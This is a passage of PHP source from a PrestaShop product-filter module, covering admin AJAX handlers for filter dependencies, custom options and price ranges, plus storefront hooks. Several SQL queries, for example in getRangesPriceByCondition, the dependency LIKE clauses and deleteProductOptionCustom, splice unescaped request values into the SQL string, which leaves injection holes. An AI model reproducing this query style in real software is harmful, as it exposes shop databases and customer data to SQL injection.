            Configuration::updateValue('FPP_DISPLAY_EXPAND_BUTTON_OPTION', $show_button_expand_options) &&
            Configuration::updateValue('FPP_ONLY_PRODUCTS_STOCK', $show_only_products_stock) &&
            Configuration::updateValue('FPP_ID_CONTENT_RESULTS', $id_content_results)
        )
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('The settings was successfully updated')));
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' =>  $this->l('An error occurred while trying update settings ')));
    }

    public function getUnavailableOptionsByOptions($options, $id_searcher = 1) {
        if (empty($options) || !is_array($options))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve unavailable options.')));    
        
        $id_filter = (int)Tools::getValue('id_filter', '');
        
        $unavailable_options = OptionClass::getUnavailableOptionsByOptions($options, $id_searcher, $id_filter);

        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'data' => $unavailable_options));
    }

    public function getCategoriesByLevelDepth($level_depth) {
        if (!is_int($level_depth))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve categories by level depth.')));

        $categories = Db::getInstance()->ExecuteS("
            SELECT 
                c.*,
                cl.name
            FROM
                " . _DB_PREFIX_ . "category AS c,
                " . _DB_PREFIX_ . "category_lang AS cl
            WHERE
                c.id_category = cl.id_category
                AND cl.id_lang = " . $this->id_lang . "
                AND c.level_depth = " . $level_depth . "
        ");

        if ($categories || is_array($categories))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'data' => $categories));
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve categories by level depth.')));
    }

    public function getValuesByFeature($id_feature) {
        if (!is_int($id_feature))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve values by feature.')));

        $values = Db::getInstance()->ExecuteS("
            SELECT
                fv.id_feature_value,
                fvl.value
            FROM
                " . _DB_PREFIX_ . "feature_value AS fv,
                " . _DB_PREFIX_ . "feature_value_lang AS fvl
            WHERE
                fvl.id_feature_value = fv.id_feature_value
                AND fvl.id_lang = " . $this->id_lang . "
                AND fv.id_feature = " . $id_feature . "
        ");

        if ($values || is_array($values))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'data' => $values));
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve values by feature.')));
    }

    public function getAttributesByAttributeGroup($id_attribute_group) {
        if (!is_int($id_attribute_group))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve attributes.')));

        $attributes = Db::getInstance()->ExecuteS("
            SELECT
                a.id_attribute,
                a.id_attribute_group,
                CASE WHEN ag.is_color_group THEN a.color ELSE NULL END AS color,
                al.name
            FROM 
                " . _DB_PREFIX_ . "attribute AS a,
                " . _DB_PREFIX_ . "attribute_lang AS al,
                " . _DB_PREFIX_ . "attribute_group AS ag
            WHERE 
                al.id_attribute = a.id_attribute
                AND a.id_attribute_group = ag.id_attribute_group
                AND al.id_lang = " . $this->id_lang . "
                AND a.id_attribute_group = " . $id_attribute_group . "
                AND ag.id_attribute_group = " . $id_attribute_group . "
        ");

        if ($attributes || is_array($attributes))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'data' => $attributes));
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve attributes.')));
    }

    /*
     * Funciones para Dependencias de Filtro
     */

    public function getDependenciesFilters($id_searcher = 0) {
        $filters = FilterClass::getFilters($this->id_lang);
        $filters = FilterClass::getFiltersListBySearcher($this->id_lang, $id_searcher);
        $dependencies = array();

        foreach ($filters as $filter) {
            $id_filter = $filter['id_filter'];
            $id_parent = (int) $filter['id_parent'];

            if ($id_parent == 0) {
                self::$_dependencies = array();
                self::getRecursiveDependencies($id_filter);

                $dependencies[$id_filter] = self::$_dependencies;
            }
        }

        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'data' => $dependencies));
    }

    private static function getRecursiveDependencies($id_filter) {
        $filter = Db::getInstance()->ExecuteS("
            SELECT id_filter FROM " . _DB_PREFIX_ . "fpp_filter WHERE id_parent = " . (int) $id_filter . "
        ");

        if ($filter) {
            foreach ($filter as $f) {
                self::$_dependencies[] = $f['id_filter'];
                self::getRecursiveDependencies($f['id_filter']);
            }
        }
    }

    public function updateDependenciesFilters($dependencies = array(), $id_searcher = 0) {
        if (empty($dependencies) || empty($id_searcher))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update dependencies.')));

        $dependencies = $this->jsonDecode(str_replace('\"', '"', $dependencies), TRUE);

        if (!is_array($dependencies))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update dependencies.')));

        $errors = array();
        
        //Eliminar todas las dependencias por filtro
        if (!empty($id_searcher))
            Db::getInstance()->Execute("UPDATE " . _DB_PREFIX_ . "fpp_filter SET id_parent = 0, level_depth = 0 WHERE id_searcher = " . $id_searcher);
        
        foreach($dependencies as $id_filter_parent => $ids_filter_children){
            $FilterClass = new FilterClass($id_filter_parent);
            if (Validate::isLoadedObject($FilterClass)) {
                $FilterClass->id_parent = 0;
                $FilterClass->level_depth = 0;
                if (!$FilterClass->update())
                    $errors[] = $this->l('An error occurred while trying update parent for filter :') . $FilterClass->name[$this->id_lang];
            }
            
            foreach ($ids_filter_children as $index => $id_filter_child){
                $id_filter_parent = ($index == 0 ? $id_filter_parent : $ids_filter_children[$index - 1]);

                $FilterClass = new FilterClass($id_filter_child);
                if (Validate::isLoadedObject($FilterClass)) {
                    $FilterClass->id_parent = $id_filter_parent;
                    $FilterClass->level_depth = ++$index;
                    if (!$FilterClass->update())
                        $errors[] = $this->l('An error occurred while trying update parent for filter :') . $FilterClass->name[$this->id_lang];
                }
            }
        }   
        
        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('The process ended successfully.'), 'errors' => $errors));             
    }

    /*
     * Funciones para Dependencias de Opciones
     */
    public function getDataFilterDependencyOptions($id_filter = 0) {
        global $cookie;
        
        if (empty($id_filter))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve data.')));

        $FilterClass = new FilterClass($id_filter);

        if (Validate::isLoadedObject($FilterClass)){            
            if ($FilterClass->level_depth == 0 || $FilterClass->level_depth == -1){
                $options_list = OptionClass::getOptionListByFilter($this->id_lang, $FilterClass->id);
                $count_options = OptionClass::getOptionListByFilter($this->id_lang, $FilterClass->id, NULL, TRUE);
            }else{
                $options_list = OptionClass::getOptionListByFilterDependency($this->id_lang, $FilterClass->id, NULL, FALSE, FALSE);
                $count_options = OptionClass::getOptionListByFilterDependency($this->id_lang, $FilterClass->id, NULL, TRUE);
            }
            
            $data = array(
                'options_list' => $options_list,
                'is_parent' => ($FilterClass->level_depth == 0 ? true : false),
                'count_options' => $count_options
            );

            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'data' => $data));
        }
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve data.')));
    }
    
    public function getOptionsChild($id_filter_parent = 0, $id_option_parent = 0, $id_dependency_option = 0) {
        if (empty($id_filter_parent) || empty($id_option_parent))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve data.')));

        $FilterClass = new FilterClass($id_filter_parent);

        if (Validate::isLoadedObject($FilterClass)) {
            $data = array();

            $filter_child = Db::getInstance()->getRow("
                SELECT id_filter, level_depth 
                    FROM 
                        " . _DB_PREFIX_ . "fpp_filter 
                    WHERE 
                        id_parent = " . (int) $FilterClass->id . " AND
                        criterion = '". $this->GLOBAL->Criterions->Custom ."'
            ");
            
            if ($filter_child){                                
                $data['id_filter_child'] = $filter_child['id_filter'];
                $options_child = OptionClass::getOptionListByFilter($this->id_lang, $filter_child['id_filter']);  
                
                $ids_option_parent = Db::getInstance()->getValue("
                    SELECT 
                        ids_option 
                    FROM 
                        " . _DB_PREFIX_ . "fpp_dependency_option 
                    WHERE 
                        id_dependency_option = " . (int)$id_dependency_option);
                                    
                $dependency_options = Db::getInstance()->ExecuteS("
                    SELECT 
                        * 
                    FROM 
                        " . _DB_PREFIX_ . "fpp_dependency_option 
                    WHERE 
                        id_filter = " . (int)$filter_child['id_filter'] . "
                        ".(!empty($id_dependency_option) ? " AND ids_option LIKE '" . $ids_option_parent . ",%'" : ""));

                $i=0;
                $data['options_child'] = array();
                foreach($options_child AS $option_child){
                    $data['options_child'][$i] = $option_child;
                    $data['options_child'][$i]['selected'] = false;
                    
                    if (sizeof($dependency_options))
                        foreach($dependency_options AS $dependency_option){
                            $arr_ids_option = explode(',', $dependency_option['ids_option']);

                            if (empty($id_dependency_option)){
                                if ($option_child['id_option'] == $arr_ids_option[$filter_child['level_depth']] && $id_option_parent == $arr_ids_option[$FilterClass->level_depth]){
                                    $data['options_child'][$i]['id_dependency_option'] = $dependency_option['id_dependency_option'];
                                    $data['options_child'][$i]['selected'] = true;                            
                                }
                            }else{
                                if ($option_child['id_option'] == $arr_ids_option[$filter_child['level_depth']]){
                                    $data['options_child'][$i]['id_dependency_option'] = $dependency_option['id_dependency_option'];
                                    $data['options_child'][$i]['selected'] = true;                            
                                }
                            }                                                        
                        }
                        
                    $i++;
                }
            }else
                $data['options_child'] = array();

            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'data' => $data));
        }
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve data.')));
    }
    
    public function getDependenciesOptions($id_filter_parent = 0) {
        if (empty($id_filter_parent))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve data.')));

        $dependencies = array();
        $options_dependency = Db::getInstance()->ExecuteS("
            SELECT * FROM " . _DB_PREFIX_ . "fpp_dependency_option WHERE id_filter_parent = " . (int) $id_filter_parent . "
        ");

        if ($options_dependency) {
            foreach ($options_dependency as $option_dependency) {
                $dependencies[$option_dependency['id_option_parent']][] = $option_dependency['id_option'];
            }
        }

        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'data' => $dependencies));
    }

    public function updateDependenciesOptions($id_filter_parent = 0, $id_filter_child = 0, $options_checked, $dependency_option_checked, $options_unchecked) {
        if (empty($id_filter_parent) || empty($id_filter_child))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update dependencies.')));

        $options_checked           = $this->jsonDecode($options_checked, TRUE);
        $dependency_option_checked = $this->jsonDecode($dependency_option_checked, TRUE);
        $options_unchecked         = $this->jsonDecode($options_unchecked, TRUE);
        
        $FilterParentClass = new FilterClass($id_filter_parent);
        $FilterChildClass = new FilterClass($id_filter_child);
        
        if (Validate::isLoadedObject($FilterParentClass) && Validate::isLoadedObject($FilterChildClass)){
            if (sizeof($options_checked)){
                //elimina las dependencias que tengan las opciones que fueron unchecked o eliminadas de la dependencia.
                //tambien se eliminan las opciones enviadas.                    
                foreach($options_unchecked AS $_id_option_parent => $_ids_options){
                    if (sizeof($_ids_options))
                        foreach($_ids_options AS $_id_option){                                                                 
                            //Eliminacion de los productos que fueron indexados con las dependencias eliminadas.
                            $dependency_options = Db::getInstance()->ExecuteS("
                                SELECT * 
                                    FROM " . _DB_PREFIX_ . "fpp_dependency_option 
                                WHERE
                                    ids_option LIKE '" . $_id_option_parent . ',' . $_id_option . "%'");
                            foreach($dependency_options AS $_dependency_option){
                                Db::getInstance()->Execute("
                                    DELETE 
                                        FROM " . _DB_PREFIX_ . "fpp_index_product 
                                    WHERE
                                        id_dependency_option = " . $_dependency_option['id_dependency_option']);
                            }
                            
                            //Eliminacion de todas las dependencias de la opcion y elimininacion de la misma opcion.
                            Db::getInstance()->Execute("
                                DELETE 
                                    FROM " . _DB_PREFIX_ . "fpp_dependency_option 
                                WHERE
                                    ids_option LIKE '" . $_id_option_parent . ',' . $_id_option . "%'");
                        }                        
                }
                
                foreach ($options_checked AS $id_option_parent => $ids_options){                    
                    foreach($ids_options AS $id_option){                         
                        if (Db::getInstance()->executeS(
                            'SELECT * FROM 
                                '._DB_PREFIX_.'fpp_dependency_option 
                            WHERE 
                                ids_option LIKE "' . $id_option_parent . ',' . $id_option . '%"'))
                            continue;                                

                        $values = array(
                            'id_filter' => $id_filter_child,
                            'id_filter_parent' => $id_filter_parent,
                            'ids_option' => $id_option_parent .','. $id_option
                        );
            
                        if (!Db::getInstance()->AutoExecute(_DB_PREFIX_ . 'fpp_dependency_option', $values, 'INSERT'))
                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update dependency options.')));                                                               
                    }                                    
                }
            }elseif(sizeof($dependency_option_checked)){
                //elimina las dependencias que tengan las opciones que fueron unchecked o eliminadas de la dependencia.
                //tambien se eliminan las opciones enviadas.                    
                foreach($options_unchecked AS $_id_dependency_option_parent => $_ids_options){
                    $dependency_option = Db::getInstance()->getRow('SELECT * FROM '._DB_PREFIX_.'fpp_dependency_option WHERE id_dependency_option = '.(int)$_id_dependency_option_parent);
                    
                    if (sizeof($_ids_options))
                        foreach($_ids_options AS $_id_option){                                                                 
                            //Eliminacion de los productos que fueron indexados con las dependencias eliminadas.
                            $dependency_options = Db::getInstance()->ExecuteS("
                                SELECT * 
                                    FROM " . _DB_PREFIX_ . "fpp_dependency_option 
                                WHERE
                                    ids_option LIKE '" . $dependency_option['ids_option'] . ',' . $_id_option . "%'");
                            foreach($dependency_options AS $_dependency_option){
                                Db::getInstance()->Execute("
                                    DELETE 
                                        FROM " . _DB_PREFIX_ . "fpp_index_product 
                                    WHERE
                                        id_dependency_option = " . $_dependency_option['id_dependency_option']);
                            }
                            
                            //Eliminacion de todas las dependencias de la opcion y elimininacion de la misma opcion.
                            Db::getInstance()->Execute("
                                DELETE 
                                    FROM " . _DB_PREFIX_ . "fpp_dependency_option 
                                WHERE
                                    ids_option LIKE '" . $dependency_option['ids_option'] . ',' . $_id_option . "%'");
                        }                        
                }
                    
                foreach ($dependency_option_checked AS $id_dependency_option_parent => $ids_options){
                    $dependency_option = Db::getInstance()->getRow('SELECT * FROM '._DB_PREFIX_.'fpp_dependency_option WHERE id_dependency_option = '.(int)$id_dependency_option_parent);                                        
                    
                    if ($dependency_option){
                        foreach($ids_options AS $id_option){                         
                            if (Db::getInstance()->executeS(
                                'SELECT * FROM 
                                    '._DB_PREFIX_.'fpp_dependency_option 
                                WHERE 
                                    ids_option LIKE "' . $dependency_option['ids_option'] . ',' . $id_option . '%"'))
                                continue;                                
   
                            $values = array(
                                'id_filter' => $id_filter_child,
                                'id_filter_parent' => $id_filter_parent,
                                'ids_option' => $dependency_option['ids_option'] .','. $id_option
                            );
                
                            if (!Db::getInstance()->AutoExecute(_DB_PREFIX_ . 'fpp_dependency_option', $values, 'INSERT'))
                                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update dependency options.')));                                                               
                        }
                    }                 
                }                
            }            
        }
        
        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('The process ended successfully.')));
    }

    /*
     * Funciones para Opciones Customizadas
     */

    public function updateOptionCustomName($id_option = NULL, $id_option_criterion = NULL, $id_filter = 0, $names = '[]', $id_searcher = 0) {
        if (empty($id_filter) || empty($id_searcher) || empty($names))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save option custom.')));

        $names = $this->jsonDecode(str_replace('\"', '"', $names), TRUE);

        //Actualizar/Crear {OptionCriterion}
        $id_option_criterion = empty($id_option_criterion) ? NULL : $id_option_criterion;

        $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);
        $OptionCriterionClass->criterion = $this->GLOBAL->Criterions->Custom;
        $OptionCriterionClass->level_depth = 0; //Representa valor {NULL}
        $OptionCriterionClass->id_table = 0; //Representa valor {NULL}
        $OptionCriterionClass->value = $names;

        if ($OptionCriterionClass->save()) {
            $id_option = empty($id_option) ? NULL : $id_option;

            $OptionClass = new OptionClass($id_option);
            $OptionClass->id_filter = $id_filter;
            $OptionClass->id_option_criterion = $OptionCriterionClass->id;
            $OptionClass->position = 1;
            $OptionClass->active = TRUE;

            if ($OptionClass->save())
                return $this->jsonEncode(array(
                            'message_code' => VAR_FILTERPRODUCTSPRO_EXITO,
                            'message' => $this->l('The option custom was saved successfully'),
                            'data' => array(
                                'option' => $OptionClass
                            )
                        ));
            else
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save option custom.')));
        }
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save option criterion for option custom.')));
    }

    public function getProductsByOptionCustom($id_filter, $id_option, $id_dependency_option) {
        if (empty($id_filter) || empty($id_option))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve data.')));

        $products = array();
        
        if (!empty($id_dependency_option)){
            $products = Db::getInstance()->ExecuteS("
                SELECT
                    ip.id_product,
                    pl.name
                FROM 
                    " . _DB_PREFIX_ . "fpp_index_product AS ip,
                    " . _DB_PREFIX_ . "product_lang AS pl
                WHERE
                    ip.id_product = pl.id_product AND 
                    ip.id_dependency_option = " . (int)$id_dependency_option ."
                GROUP BY ip.id_product        
            ");
        }else{
            $products = Db::getInstance()->ExecuteS("
                SELECT
                    ip.id_product,
                    pl.name
                FROM 
                    " . _DB_PREFIX_ . "fpp_index_product AS ip,
                    " . _DB_PREFIX_ . "product_lang AS pl
                WHERE
                    ip.id_product = pl.id_product AND 
                    ip.id_option = " . (int)$id_option ." AND
                    ip.id_filter = " . (int)$id_filter ."
                GROUP BY ip.id_product        
            ");
        }

        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'data' => $products));
    }

    public function loadOption($id_option = 0) {
        if (empty($id_option))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve data.')));

        $OptionClass = new OptionClass($id_option);

        if (Validate::isLoadedObject($OptionClass)) {
            $OptionCriterion = new OptionCriterionClass($OptionClass->id_option_criterion);

            return $this->jsonEncode(array(
                        'message_code' => VAR_FILTERPRODUCTSPRO_EXITO,
                        'data' => array(
                            'option' => $OptionClass,
                            'option_criterion' => $OptionCriterion
                        )
                    ));
        }
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve data.')));
    }

    public function deleteOptionCustom($id_option = 0) {
        if (empty($id_option))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete option custom.')));

        $OptionClass = new OptionClass($id_option);

        if (Validate::isLoadedObject($OptionClass) && $OptionClass->delete(true))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('The option custom was successfully deleted.')));        
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve data.')));
    }

    public function addProductOptionCustom($id_searcher, $id_filter, $id_option, $id_dependency_option, $id_product) {
        if (empty($id_option) || empty($id_product))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save product.')));

        $values = array(
            'id_searcher' => $id_searcher,
            'id_filter' => $id_filter,
            'id_option' => $id_option,
            'id_product' => $id_product,
            'id_dependency_option' => $id_dependency_option
        );

        if (!Db::getInstance()->AutoExecute(_DB_PREFIX_ . 'fpp_index_product', $values, 'INSERT'))                
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save product.')));
                
        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO));
    }

    public function deleteProductOptionCustom($id_option = 0, $id_dependency_option = 0, $id_product = 0) {
        if (empty($id_option) || empty($id_product))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete product.')));

        if (Db::getInstance()->Execute("
            DELETE FROM " . _DB_PREFIX_ . "fpp_index_product
            WHERE 
                id_option = " . $id_option . "
                AND id_product = " . $id_product . "
                ".(!empty($id_dependency_option) ? ' AND id_dependency_option=' . (int)$id_dependency_option : '')."
        "))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO));
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete product.')));
    }

    /*
     * Funciones para Rango de Precios
     */

    public function getRangesPriceByCondition($condition = '', $ajax = FALSE) {
        $ranges = Db::getInstance()->ExecuteS("
            SELECT
                oc.*,
                ocl.value
            FROM
                " . _DB_PREFIX_ . "fpp_option_criterion AS oc,
                " . _DB_PREFIX_ . "fpp_option_criterion_lang AS ocl
            WHERE 
                ocl.id_option_criterion = oc.id_option_criterion
                AND oc.criterion = '" . $this->GLOBAL->Criterions->Price . "'
                AND (SUBSTRING(ocl.value,1,2) = '" . $condition . "' || '" . $condition . "' = '')
                AND ocl.id_lang = " . $this->id_lang . "
        ");

        if (!$ajax)
            return $ranges;
        else {
            if (is_array($ranges))
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'data' => $ranges));
            else
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve data.')));
        }
    }

    public function saveRangePrice($condition = '', $first_value = 0, $second_value = 0) {
        if (empty($condition) || !is_numeric($first_value) || !is_numeric($second_value))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save range price.')));

        //Validar regla {Between}
        if ($condition == $this->GLOBAL->ConditionsRangePrice->Bt) {
            if ($second_value <= $first_value)
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('The second value must be greater')));
        }

        $name = $condition . ',' . $first_value . ($condition == $this->GLOBAL->ConditionsRangePrice->Bt ? ',' . $second_value : '');
        $names = $this->getEmptyValuesLang($name);

        $OptionCriterionClass = new OptionCriterionClass();
        $OptionCriterionClass->criterion = $this->GLOBAL->Criterions->Price;
        $OptionCriterionClass->level_depth = 0; //Representa valor {NULL}
        $OptionCriterionClass->id_table = 0; //Representa valor {NULL}
        $OptionCriterionClass->value = $names;

        if ($OptionCriterionClass->save()) {
            //Crear opcion automaticamente para todos los filtros tipo {Price}
            $filters = FilterClass::getFiltersByCriterion($this->id_lang, $this->GLOBAL->Criterions->Price);

            foreach ($filters as $filter) {
                $id_filter = (int) $filter['id_filter'];

                if (FilterClass::verifyHasOption($id_filter, $OptionCriterionClass->id))
                    continue;

                $OptionClass = new OptionClass();
                $OptionClass->id_filter = $id_filter;
                $OptionClass->id_option_criterion = $OptionCriterionClass->id;
                $OptionClass->position = 0; //Representa valor {NULL}
                $OptionClass->active = FALSE;

                if ($OptionClass->save()) {
                    $this->indexProductsForPrice($id_filter);
                }
            }

            return $this->jsonEncode(array(
                        'message_code' => VAR_FILTERPRODUCTSPRO_EXITO,
                        'message' => $this->l('The range price was saved successfully'),
                        'data' => array(
                            'option_criterion' => $OptionCriterionClass
                        )
                    ));
        }
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save range price.')));
    }

    public function deleteRangePrice($id_option_criterion = 0) {
        if (empty($id_option_criterion))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete range price.')));

        $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);

        if (Validate::isLoadedObject($OptionCriterionClass) && OptionClass::deleteOptionsByIdOptionCriterion($OptionCriterionClass->id) && $OptionCriterionClass->delete())
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO));
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete range price.')));
    }

    /*
     * Front
     */

    public function hookHeader($params) {
        global $smarty, $cookie;
        
        $this->addFrontOfficeJS(($this->_path) . 'js/' . $this->name . '.js');
        $this->addFrontOfficeJS(($this->_path) . 'js/jquery.blockUI.js');
        
        $this->addFrontOfficeCSS(($this->_path) . 'css/' . $this->name . '.css', 'all');
        $this->addFrontOfficeCSS(_THEME_CSS_DIR_ . 'product_list.css', 'all');

        //Validar si llega el parametro {id_category}
        $id_category = (int) Tools::getValue('id_category', NULL);
        $id_manufacturer = (int) Tools::getValue('id_manufacturer', NULL);
        $id_supplier = (int) Tools::getValue('id_supplier', NULL);
        $url = $this->getHttpHost(true, true) . $_SERVER['REQUEST_URI'];
        
        $smarty->assign(array(
            'URL' => $url,
            'ID_CATEGORY' => $id_category,
            'ID_MANUFACTURER' => $id_manufacturer,
            'ID_SUPPLIER' => $id_supplier,
            'FILTERPRODUCTSPRO_DIR' => $this->_path,
            'FILTERPRODUCTSPRO_IMG' => $this->_path . 'img/',
            'GLOBALS_SMARTY' => $this->GLOBALS_SMARTY,
            'GLOBAL_JS' => $this->jsonEncode($this->GLOBAL),
            'FPP_ID_CONTENT_RESULTS' => Configuration::get('FPP_ID_CONTENT_RESULTS'),
            'FPP_IS_PS_15' => (version_compare(_PS_VERSION_, '1.5') >= 0 ? true : false)
        ));                                

        return $this->display(__FILE__, 'header.tpl');
    }

    public function hookRightColumn($params) {
        return $this->displaySearcherHook($this->GLOBAL->Positions->Right);
    }

    public function hookLeftColumn($params) {
        return $this->displaySearcherHook($this->GLOBAL->Positions->Left);
    }

    public function hookTop($params) {
        return $this->displaySearcherHook($this->GLOBAL->Positions->Top);
    }
    
    public function hookHome($params){
        global $smarty;
        
        $is_custom = array_key_exists('position', $params);
        $all_searchers = $this->getFilterByPositions(array(($is_custom ? $this->GLOBAL->Positions->Custom : $this->GLOBAL->Positions->Home)));
        
        //restriccion de mostrar o no el buscador segun las categorias configuradas.
        if (sizeof($all_searchers['all_searchers'])){            
            $i=0;
            foreach($all_searchers['all_searchers'] AS $searcher){                                
                if(!empty($searcher['filter_categories'])){
                    $categories = explode(',', $searcher['filter_categories']);
                    
                    if (!isset($_GET['id_category']) && strpos($_SERVER['PHP_SELF'], 'index.php') !== false){                    
                        if (($searcher['type_filter_category'] == $this->GLOBAL->TypeFilterCategory->AllCategories && in_array(1, $categories))
                            OR ($searcher['type_filter_category'] == $this->GLOBAL->TypeFilterCategory->OnlyCategories && !in_array(1, $categories))
                        ){
                            unset($all_searchers['all_searchers'][$i]);
                        }
                    }elseif (isset($_GET['id_category'])){                                    
                        if (($searcher['type_filter_category'] == $this->GLOBAL->TypeFilterCategory->AllCategories && in_array($_GET['id_category'], $categories))
                            OR ($searcher['type_filter_category'] == $this->GLOBAL->TypeFilterCategory->OnlyCategories && !in_array($_GET['id_category'], $categories))
                        ){
                            unset($all_searchers['all_searchers'][$i]);
                        }
                    } 
                }                               
                $i++;
            }            
        }
        
        $smarty->assign(array(
            'FILTERPRODUCTSPRO_DIR' => $this->_path,
            'FILTERPRODUCTSPRO_DIR_TPL' => dirname(__FILE__) . '/',
            'FILTERPRODUCTSPRO_IMG' => $this->_path . 'img/',
            'SEARCHERS' => $all_searchers['all_searchers'],
            'OPTIONS_FILTER_HIDE' => $all_searchers['options_filter_hide'],
            'GLOBAL' => $this->GLOBAL,
            'FPP_DISPLAY_BACK_BUTTON_FILTERS' => (int)Configuration::get('FPP_DISPLAY_BACK_BUTTON_FILTERS'),
            'FPP_DISPLAY_EXPAND_BUTTON_OPTION' => (int)Configuration::get('FPP_DISPLAY_EXPAND_BUTTON_OPTION'),
            'FPP_ONLY_PRODUCTS_STOCK' => (int)Configuration::get('FPP_ONLY_PRODUCTS_STOCK')
        ));
                
        return $this->display(__FILE__, $this->name . '_home.tpl');        
    }
    
    public function hookFilterProductsPro($params){
        $params['position'] = 'Custom';
        
        return $this->hookHome($params);
    }

    private function displaySearcherHook($position) {
        global $smarty;

        $all_searchers = $this->getFilterByPositions(array($position));
        //restriccion de mostrar o no el buscador segun las categorias configuradas.
        if (sizeof($all_searchers['all_searchers'])){
            foreach($all_searchers['all_searchers'] AS $key => $searcher){
                if(!empty($searcher['filter_categories'])){
                    $categories = explode(',', $searcher['filter_categories']);
                    
